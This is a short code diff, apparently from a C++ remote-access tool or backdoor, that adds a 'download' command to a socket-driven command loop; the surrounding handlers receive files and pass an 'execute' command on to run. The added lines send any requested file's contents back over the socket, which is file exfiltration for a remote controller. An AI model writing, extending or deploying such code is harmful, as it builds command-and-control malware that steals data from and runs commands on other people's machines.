@@ -257,6 +257,13 @@ int main(int argc, char* argv[])
                 send(s, callback.c_str(), callback.size(), 0);
                 ReceiveFile(s, filename);
             }
+            else if (command.substr(0, 8) == "download") {
+                std::string filePath = command.substr(9);
+
+                std::string callback = "Downloading file: " + filePath;
+                send(s, callback.c_str(), callback.size(), 0);
+                SendFile(s, &filePath[0]);
+            }
             else if (command.substr(0, 7) == "execute")
             { 
                 std::string cmd = command.substr(8);
